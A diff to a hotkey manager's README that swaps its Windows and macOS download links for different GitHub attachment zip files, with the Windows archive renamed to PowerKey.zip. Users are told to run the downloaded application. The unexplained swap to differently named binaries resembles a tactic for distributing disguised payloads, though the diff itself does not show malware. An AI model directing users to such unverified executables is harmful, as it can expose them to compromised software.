@@ -22,8 +22,8 @@ A modern, cross-platform hotkey manager that supercharges your workflow with cus
 ## 📥 Installation
 
 1. Download the appropriate version for your operating system:
-   - [Windows Download](https://github.com/user-attachments/files/18775243/superkey.zip)
-   - [macOS Download](https://github.com/user-attachments/files/18775291/MacSuperkey.zip)
+   - [Windows Download](https://github.com/user-attachments/files/18776822/PowerKey.zip)
+   - [macOS Download](https://github.com/user-attachments/files/18777350/macsuperkey.zip)
 
 2. Extract the downloaded file
 3. Run the application
